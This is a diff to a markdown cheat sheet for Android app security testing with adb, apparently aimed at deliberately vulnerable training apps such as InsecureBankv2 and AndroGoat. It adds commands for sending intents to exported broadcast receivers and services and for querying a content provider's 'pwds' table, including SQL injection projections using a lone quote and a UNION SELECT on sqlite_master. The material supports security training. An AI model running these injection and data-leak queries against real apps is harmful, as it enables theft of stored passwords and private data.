@@ -83,7 +83,30 @@ adb shell am start-activity -n com.android.insecurebankv2/.PostLogin -d "https:/
 ### Broadcast
 Sending strings via Intent with broadcast receivers
 ```
+adb shell am broadcast -n <broadcastname> -a <actionname> -e key value
+```
+Example:
+```
 adb shell am broadcast -n com.android.insecurebankv2/.BrReciever -a android.intent.action.ACTION_SEND -e uid appsec
 ```
 
 ### Services exploit
+Sending strings via Intent with services
+```
+adb shell am startservice -n <servicename> --es key value
+```
+Example:
+```
+adb shell am startservice -n com.androgoat/.DataLeakService --es "leak_data" "tr"
+```
+
+#### Exploiting Content providers
+```
+adb shell content query --uri <contentprovideruri>
+```
+Example:
+```
+adb shell content query --uri content://com.example.vulnerableapp.provider/pwds
+adb shell content query --uri content://com.example.vulnerableapp.provider/pwds --projection "'"
+adb shell content query --uri content://com.example.vulnerableapp.provider --projection "' UNION SELECT * FROM sqlite_master WHERE type='table';-- "
+```
